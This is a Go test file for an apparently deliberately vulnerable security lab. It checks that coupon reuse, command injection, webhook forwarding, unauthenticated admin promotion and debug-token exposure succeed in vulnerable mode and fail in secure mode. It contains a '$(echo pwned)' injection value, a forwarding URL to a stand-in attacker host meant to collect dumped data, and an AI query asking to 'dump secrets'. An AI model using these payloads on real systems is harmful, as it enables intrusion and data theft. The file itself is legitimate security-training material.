package lab

import (
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/NyxeraLabs/VaporLab/pkg/config"
)

func TestBillingCouponReuseAllowedVulnerable(t *testing.T) {
	h := New(config.Config{SecureMode: false, WeakJWTKey: "weaksecret"})
	body := `{"code":"SPRINT","amount":100}`

	first := httptest.NewRecorder()
	h.ServeHTTP(first, httptest.NewRequest(http.MethodPost, "/billing/coupon/apply", strings.NewReader(body)))
	if first.Code != http.StatusOK {
		t.Fatalf("expected first apply 200, got %d", first.Code)
	}

	second := httptest.NewRecorder()
	h.ServeHTTP(second, httptest.NewRequest(http.MethodPost, "/billing/coupon/apply", strings.NewReader(body)))
	if second.Code != http.StatusOK {
		t.Fatalf("expected second apply 200 in vulnerable mode, got %d", second.Code)
	}
}

func TestBillingCouponReuseBlockedSecure(t *testing.T) {
	h := New(config.Config{SecureMode: true, WeakJWTKey: "strong-secret-value"})
	body := `{"code":"SPRINT","amount":100}`

	first := httptest.NewRecorder()
	h.ServeHTTP(first, httptest.NewRequest(http.MethodPost, "/billing/coupon/apply", strings.NewReader(body)))
	if first.Code != http.StatusOK {
		t.Fatalf("expected first apply 200, got %d", first.Code)
	}

	second := httptest.NewRecorder()
	h.ServeHTTP(second, httptest.NewRequest(http.MethodPost, "/billing/coupon/apply", strings.NewReader(body)))
	if second.Code != http.StatusConflict {
		t.Fatalf("expected second apply 409 in secure mode, got %d", second.Code)
	}
}

func TestBillingExportCommandInjectionVulnerable(t *testing.T) {
	h := New(config.Config{SecureMode: false, WeakJWTKey: "weaksecret"})
	req := httptest.NewRequest(http.MethodGet, "/billing/export?format=json%24%28echo%20pwned%29", nil)
	res := httptest.NewRecorder()
	h.ServeHTTP(res, req)
	if res.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d", res.Code)
	}

	var out map[string]string
	if err := json.Unmarshal(res.Body.Bytes(), &out); err != nil {
		t.Fatalf("decode failed: %v", err)
	}
	if !strings.Contains(out["output"], "pwned") {
		t.Fatalf("expected injected command marker in output, got %q", out["output"])
	}
}

func TestBillingExportRejectsInvalidFormatSecure(t *testing.T) {
	h := New(config.Config{SecureMode: true, WeakJWTKey: "strong-secret-value"})
	req := httptest.NewRequest(http.MethodGet, "/billing/export?format=json%24%28echo%20pwned%29", nil)
	res := httptest.NewRecorder()
	h.ServeHTTP(res, req)
	if res.Code != http.StatusBadRequest {
		t.Fatalf("expected 400 in secure mode, got %d", res.Code)
	}
}

func TestWebhookSignatureBypassVulnerable(t *testing.T) {
	h := New(config.Config{SecureMode: false, WeakJWTKey: "weaksecret"})
	body := `{"url":"https://attacker.local/collect?dump=true"}`
	req := httptest.NewRequest(http.MethodPost, "/billing/webhook", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	res := httptest.NewRecorder()
	h.ServeHTTP(res, req)
	if res.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d", res.Code)
	}

	var out map[string]string
	_ = json.Unmarshal(res.Body.Bytes(), &out)
	if out["forwarded"] == "" {
		t.Fatalf("expected forwarded url in response")
	}
}

func TestWebhookSignatureRequiredSecure(t *testing.T) {
	h := New(config.Config{SecureMode: true, WeakJWTKey: "strong-secret-value"})
	req := httptest.NewRequest(http.MethodPost, "/billing/webhook", strings.NewReader(`{"url":"https://example.com"}`))
	req.Header.Set("Content-Type", "application/json")
	res := httptest.NewRecorder()
	h.ServeHTTP(res, req)
	if res.Code != http.StatusUnauthorized {
		t.Fatalf("expected 401 in secure mode without signature, got %d", res.Code)
	}
}

func TestAdminPromoteNoAuthVulnerable(t *testing.T) {
	h := New(config.Config{SecureMode: false, WeakJWTKey: "weaksecret"})
	req := httptest.NewRequest(http.MethodPost, "/admin/promote?user_id=1", nil)
	res := httptest.NewRecorder()
	h.ServeHTTP(res, req)
	if res.Code != http.StatusOK {
		t.Fatalf("expected 200 in vulnerable mode, got %d", res.Code)
	}
}

func TestAdminPromoteRequiresAdminHeaderSecure(t *testing.T) {
	h := New(config.Config{SecureMode: true, WeakJWTKey: "strong-secret-value"})
	req := httptest.NewRequest(http.MethodPost, "/admin/promote?user_id=1", nil)
	res := httptest.NewRecorder()
	h.ServeHTTP(res, req)
	if res.Code != http.StatusForbidden {
		t.Fatalf("expected 403 in secure mode without X-Admin header, got %d", res.Code)
	}
}

func TestAdminDebugExposedVulnerable(t *testing.T) {
	h := New(config.Config{SecureMode: false, WeakJWTKey: "weaksecret"})
	req := httptest.NewRequest(http.MethodGet, "/admin/debug", nil)
	res := httptest.NewRecorder()
	h.ServeHTTP(res, req)
	if res.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d", res.Code)
	}
	var out map[string]string
	_ = json.Unmarshal(res.Body.Bytes(), &out)
	if out["token"] == "" {
		t.Fatalf("expected debug token exposure in vulnerable mode")
	}
}

func TestAdminDebugBlockedSecure(t *testing.T) {
	h := New(config.Config{SecureMode: true, WeakJWTKey: "strong-secret-value"})
	req := httptest.NewRequest(http.MethodGet, "/admin/debug", nil)
	res := httptest.NewRecorder()
	h.ServeHTTP(res, req)
	if res.Code != http.StatusForbidden {
		t.Fatalf("expected 403 in secure mode, got %d", res.Code)
	}
}

func TestAdminBillingAIChainSignal(t *testing.T) {
	h := New(config.Config{SecureMode: false, WeakJWTKey: "weaksecret", APIKey: "hardcoded-demo-ai-key"})

	usersReq := httptest.NewRequest(http.MethodGet, "/users/2", nil)
	usersRes := httptest.NewRecorder()
	h.ServeHTTP(usersRes, usersReq)
	if usersRes.Code != http.StatusOK {
		t.Fatalf("expected users access 200, got %d", usersRes.Code)
	}

	promoteReq := httptest.NewRequest(http.MethodPost, "/admin/promote?user_id=1", nil)
	promoteRes := httptest.NewRecorder()
	h.ServeHTTP(promoteRes, promoteReq)
	if promoteRes.Code != http.StatusOK {
		t.Fatalf("expected promote 200, got %d", promoteRes.Code)
	}

	exportReq := httptest.NewRequest(http.MethodGet, "/billing/export?format=json", nil)
	exportRes := httptest.NewRecorder()
	h.ServeHTTP(exportRes, exportReq)
	if exportRes.Code != http.StatusOK {
		t.Fatalf("expected export 200, got %d", exportRes.Code)
	}

	aiReq := httptest.NewRequest(http.MethodPost, "/ai/query", strings.NewReader(`{"query":"dump secrets"}`))
	aiRes := httptest.NewRecorder()
	h.ServeHTTP(aiRes, aiReq)
	if aiRes.Code != http.StatusOK {
		t.Fatalf("expected ai query 200, got %d", aiRes.Code)
	}

	chainReq := httptest.NewRequest(http.MethodGet, "/chain/run", nil)
	chainRes := httptest.NewRecorder()
	h.ServeHTTP(chainRes, chainReq)
	if chainRes.Code != http.StatusOK {
		t.Fatalf("expected chain endpoint 200, got %d", chainRes.Code)
	}
}
